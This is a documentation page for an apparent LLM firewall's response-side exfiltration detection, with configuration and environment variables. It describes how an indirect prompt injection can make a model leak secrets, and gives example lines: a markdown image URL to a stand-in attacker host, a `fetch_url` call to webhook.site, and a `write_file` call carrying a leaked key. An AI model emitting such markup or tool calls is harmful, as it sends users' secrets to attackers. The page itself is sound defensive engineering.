[llm-fw](../../README.md) > [Documentation](../README.md) > Response-Side Exfiltration Detection

# Response-Side Exfiltration Detection

Input-side detection stops a poisoned prompt going *in*; this stops stolen data coming *out*. A model whose context was poisoned (indirect injection) commonly exfiltrates by emitting markup the **client auto-renders** — the classic zero-click vector is a markdown image, `![x](https://attacker/?d=<secret>)`, which the chat UI fetches immediately, leaking the query string with no user click. Links are the one-click variant.

`llm-fw` scans the **model's response** for markdown/HTML image and link URLs and runs each destination through the same URL classifier used for outbound requests (allowlist, known-sink list, DGA and path-exfil heuristics — so an image to an allowlisted CDN is fine, one to `webhook.site` is not). It is provider-agnostic (scans the decoded response text) and works on **compressed responses** too: the proxy now gunzip/brotli/deflate-decodes inspected JSON bodies before scanning (previously compressed bodies skipped inspection).

- **audit** (default) — emit an event and forward unchanged.
- **block** — additionally neutralize the offending URL in buffered (non-streaming) JSON responses, replacing it with an inert placeholder so the agent still gets a valid turn without the auto-fetch. Streaming (SSE) responses are audited (already-sent bytes can't be retracted).

Events appear on the dashboard under the **Response Exfil** badge with a `response-exfil` stage chip.

The same `responseScan` block also carries the regex-based **harmful-compliance** scan (always audit-only, on by default) and the opt-in **trained output classifier** (`protectai/distilroberta-base-rejection-v1`, disabled by default — see [item 10 in the detection stages guide](detection-stages.md#10-response-side-harmful-compliance-defense-in-depth)): it's a learned layer that detects the model *refusing* a request, and unlike the regex scan it respects `mode` (so `block` actually blocks a buffered response; streamed SSE text can only be audited since it's already been sent).

`responseScan.toolUse` closes a related but distinct vector: a model that calls a **tool** can hand it a secret, or an attacker-controlled destination, in the tool's ARGUMENTS — e.g. `write_file({content: '<leaked API key>'})` or `fetch_url({url: 'https://webhook.site/...'})` — which never appears in the visible response text a human reads. `llm-fw` extracts every `tool_use` / `tool_calls` / `functionCall` the response carries (Anthropic, OpenAI, Gemini, Bedrock — buffered JSON and streamed SSE alike) and runs the SAME DLP pattern engine and UrlClassifier used everywhere else in the firewall over each call's serialized arguments — no new detectors, no new heuristics to tune. On by default (audit); `block` withholds a buffered (non-streaming) response carrying a flagged tool call, same as the other response-side blocks. Events appear on the dashboard with a `tool-use-exfil` kind.

### Configuration

```json
{
  "responseScan": {
    "enabled": true,
    "mode": "audit",
    "harmfulCompliance": true,
    "classifier": {
      "enabled": false,
      "blockThreshold": 0.9
    },
    "toolUse": {
      "enabled": true,
      "mode": "audit"
    }
  }
}
```

Environment overrides:

| Variable | Effect |
|----------|--------|
| `LLM_FW_RESPONSE_SCAN_ENABLED` | `true`/`false` — enable or disable response-side exfil scanning |
| `LLM_FW_RESPONSE_SCAN_MODE` | `audit` \| `block` |
| `LLM_FW_RESPONSE_HARM_ENABLED` | `true`/`false` — enable or disable the regex harmful-compliance scan |
| `LLM_FW_RESPONSE_CLASSIFIER_ENABLED` | `true`/`false` — enable the opt-in trained output-moderation classifier |
| `LLM_FW_RESPONSE_CLASSIFIER_MODEL` | HF model id override (default `protectai/distilroberta-base-rejection-v1`) |
| `LLM_FW_RESPONSE_CLASSIFIER_THRESHOLD` | float 0–1 — flagged-label probability required to act (default `0.9`) |
| `LLM_FW_TOOLUSE_SCAN_ENABLED` | `true`/`false` — enable or disable the outbound tool-call argument exfiltration guard |
| `LLM_FW_TOOLUSE_SCAN_MODE` | `audit` \| `block` |
